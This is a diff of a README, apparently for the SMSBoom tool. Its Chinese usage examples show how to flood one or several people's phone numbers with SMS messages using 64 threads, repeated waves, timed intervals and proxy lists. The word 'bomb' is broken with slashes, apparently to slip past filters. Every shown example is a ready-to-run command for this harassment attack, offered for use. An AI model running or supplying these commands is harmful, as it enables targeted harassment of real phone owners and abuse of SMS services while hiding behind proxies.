@@ -68,31 +68,31 @@
    启动64个线程,轰//炸一个人的手机号(198xxxxxxxx),只轰//炸一波。
    
    ```shell
-   smsboom_pyinstall.exe run -t 64 -p 198xxxxxxxxx
+   .\smsboom.exe run -t 64 -p 198xxxxxxxxx
    ```
 
    启动64个线程,轰//炸一个人的手机号(19xxxxxxx),启动循环轰//炸, 轮番轰//炸60次
 
    ```shell
-   smsboom_pyinstall.exe run -t 64 -p 198xxxxxxxxx -f 60
+   .\smsboom.exe run -t 64 -p 198xxxxxxxxx -f 60
    ```
    
    启动64个线程,轰//炸一个人的手机号(19xxxxxxx),启动循环轰//炸, 轮番轰//炸60次, 每次间隔30秒
 
    ```shell
-   smsboom_pyinstall.exe run -t 64 -p 198xxxxxxxxx -f 60 -i 30
+   .\smsboom.exe run -t 64 -p 198xxxxxxxxx -f 60 -i 30
    ```
    
    启动64个线程,轰//炸一个人的手机号(19xxxxxxx),启动循环轰//炸, 轮番轰//炸60次, 每次间隔30秒, 开启代理列表进行轰炸
 
    ```shell
-   smsboom_pyinstall.exe run -t 64 -p 198xxxxxxxxx -f 60 -i 30 -e
+   .\smsboom.exe run -t 64 -p 198xxxxxxxxx -f 60 -i 30 -e
    ```
 
    启动64个线程,轰//炸多个人的手机号(138xxx,139xxxx),启动循环轰//炸, 轮番轰炸60次, 每次间隔30秒, 开启代理列表进行轰炸
 
    ```shell
-   smsboom_pyinstall.exe run -t 64 -p 138xxxxxxxx -p 139xxxxxxxx -f 60 -i 30 -e
+   .\smsboom.exe run -t 64 -p 138xxxxxxxx -p 139xxxxxxxx -f 60 -i 30 -e
    ```
 
 
